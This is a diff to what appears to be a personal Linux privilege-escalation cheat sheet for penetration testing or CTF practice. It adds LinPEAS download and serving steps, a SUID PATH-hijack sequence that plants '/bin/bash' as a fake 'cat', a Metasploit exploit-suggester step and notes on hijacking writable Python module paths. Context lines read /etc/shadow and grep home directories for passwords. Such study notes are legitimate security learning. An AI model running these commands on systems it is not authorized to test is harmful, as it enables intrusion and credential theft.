@@ -23,10 +23,14 @@ On Target:
 wget 'http://172.28.128.1:8000/linenum.sh' -O /tmp/linenum.sh
 
 # Enumeration with LinPEAS
+mkdir /tmp/linpeas
+cd /tmp/linpeas
+wget -c "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O /tmp/linpeas.sh
+python -m http.server
 
 
 # Enumeration with lse
-
+TODO
 
 # Looting Passwords
 grep -nril 'password' /home/ 2> /dev/null
@@ -95,10 +99,13 @@ sudo chmod +s /tmp/suid # setuid bit
 
 # Exploiting SUID binaries using relative paths
 ## Relative Path (Whenever a SUID binary is calling a program, e.g., cat)
+;; check if a binary is using relative names with "string"
+string /path/to/binary.bin
 echo $PATH
-echo '/bin/bash' > /tmp/cat
+echo '/bin/bash' > /tmp/cat  ;; sometimes also try with '/bin/sh'
 chmod 777 cat
 export PATH=/tmp:$PATH
+./path/to/binary.bin
 
 
 # Capabilities
@@ -111,6 +118,47 @@ getcap -r / 2>/dev/null
 tar -cvf shadow.tar /etc/shadow
 tar -xvf shadow.tar 
 cat etc/shadow 
+
+# Kernel Exploits
+Check common linux exploits.
+From a meterpreter session we can also do:
+
+> run post/multi/recon/local_exploit_suggester
+
+# Other
+Check what is in /opt always, we may find interesting things.
+
+# Programming Language Module Directory Writeable
+;; Reference: https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
+From time to time, you may come across a scenario where a system
+has misconfigured permissions in their Python library. Generally,
+directories that house Python modules have permissions set so that
+modifications can’t be made without elevated privileges. With that,
+there are a number of ways that users can create this vulnerability:
+1. The user creates their own Python module and forgets to restrict write
+access to it.
+2. The user decides to lessen restrictions within the
+Python library directory.
+3. The PATH variable for the Python library is configured to check 
+the current directory first.
+
+Regardless, in order to escalate privileges, we also need a way to execute
+a Python script with elevated privileges. This either means looking for
+a cronjob or scheduled task that executes Python scripts with either
+elevated privileges or leveraging other vulnerabilities, for example,
+through SUID files, to execute the script.  If we decide to explore
+this avenue as a potential method to escalate privileges, we first need
+to understand where Python looks within the file system to import its
+modules. We can leverage the "sys" module in Python to do this.
+
+    python -c 'import sys; print(sys.path)'
+
+This output shows a list of directories that Python looks in when
+importing modules. Python looks through this list in order. With this
+information, we have an idea of which directories we need to enumerate
+first. Once we find a directory we want to attack, we can start modifying
+both a target Python script or the library.
+
 
 # A recap of techniques
 
@@ -139,6 +187,8 @@ Shared Object Injection
 Binary Symlinks
 
 Environment Variables
+
+Programming Language Module Path Writeable
 
 Capabilities Attacks
 
